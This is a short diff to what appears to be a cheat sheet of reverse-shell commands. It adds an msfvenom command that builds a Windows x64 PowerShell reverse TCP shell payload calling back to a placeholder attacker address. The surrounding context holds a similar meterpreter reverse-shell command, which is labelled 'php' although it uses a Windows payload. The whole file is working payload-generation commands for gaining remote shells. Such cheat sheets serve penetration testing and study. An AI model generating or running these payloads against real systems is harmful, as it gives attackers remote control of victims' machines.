@@ -1,5 +1,8 @@
 % revshell
 
+# Windows Powershell single stage shell without meterpreter
+msfvenom -p windows/x64/shell_reverse_tcp -f psh LHOST=<attackip> -o payload.ps1
+
 # php meterpreter reverse shell
 msfvenom -p windows/x64/meterpreter_reverse_tcp -f psh LHOST=<attackip> -o payload.ps1
 
